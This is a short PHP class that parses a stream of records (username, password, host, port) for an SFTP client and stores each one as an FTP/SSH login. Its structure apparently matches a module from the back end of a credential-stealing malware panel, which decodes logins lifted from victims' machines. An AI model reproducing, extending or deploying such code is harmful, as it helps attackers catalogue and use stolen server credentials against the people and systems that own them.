<?php
//ok
class Module_sftpnetdrive extends Module_
{
    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
			$stream = new Stream($Data);
			while(TRUE)
			{
				$User	= $stream->getSTRING_();
				if($User == NULL)
					break;

				$Pass 	= $stream->getSTRING_();
				$Host	= $stream->getSTRING_();
				$Port	= $stream->getSTRING_();
				
			   $this->add_ftp($this->append_port($this->ftp_force_ssh($Host, TRUE) , $Port), $User, $Pass);
			}
			$stream = NULL;
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}
